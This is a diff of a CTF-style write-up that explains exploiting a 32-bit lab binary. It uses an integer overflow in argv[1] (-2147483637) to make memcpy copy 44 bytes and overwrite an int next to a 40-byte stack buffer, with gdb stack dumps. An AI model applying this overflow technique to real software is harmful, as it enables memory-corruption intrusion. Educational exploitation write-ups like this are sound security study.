@@ -57,15 +57,26 @@ The last condition check if the value of `atoi(argv[1])` is strictly equal to `0
 
 The buffer size used for the destination string of memcpy can be calculated:
 - `0x14(%esp)` is used as the destination address for the memcpy function. This means that str starts at an offset of 0x14 from the esp register.
--  Since the stack frame size is `0x40` bytes `(sub $0x40,%esp)`, and str starts at an offset of 0x14, we can calculate the size of str as `0x40 - 0x14 = 0x2C` bytes.
+-  Since the stack frame size is `0x40` bytes `(sub $0x40,%esp)`, and str starts at an offset of 0x14, we can calculate the size of str as `0x40 - 0x14 = 0x2C` bytes -> 44 in decimal
 
 ```
-0x0804845d <+57>:   add    $0x8,%eax            // Add 0x8 to eax
-0x08048460 <+60>:   mov    (%eax),%eax          // Dereference eax
+(gdb) run 9 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x08048326 in memcpy@plt ()
+(gdb) finish
+Run till exit from #0  0x08048326 in memcpy@plt ()
+0x08048478 in main ()
+(gdb) x/30w $esp
+0xbffff6b0:     0xbffff6c4      0xbffff8d0      0x00000024      0x080482fd
+0xbffff6c0:     0xb7fd13e4      0x61616161      0x61616161      0x61616161
+0xbffff6d0:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff6e0:     0x61616161      0x61616161      0x080484b9      0x00000009
+0xbffff6f0:     0x080484b0      0x00000000      0x00000000      0xb7e454d3
 ```
-There is also an int stored on the stack, taking 4 bytes of space, so the actual buffer size is 40 bytes.
+Using 9*4 in `memcpy` we fill the str with only `a` char `61 ASCII`
+Our int contains the value `0x00000009` and is located 40 bytes after the start of our string buffer.
+The size of the buffer is 40 bytes.
 
-The str is above the stored in, if we can use `memcpy` with 44 bytes we can overwrite the value of the int.
+The str is above the stored int value, if we can use `memcpy` with 44 bytes we can overwrite the value of the int.
 
 We need to be able to copy 44 bytes, the value of `argv[1]` should be:
 `-2147483637` which will give us 44 when multiplied by 4.
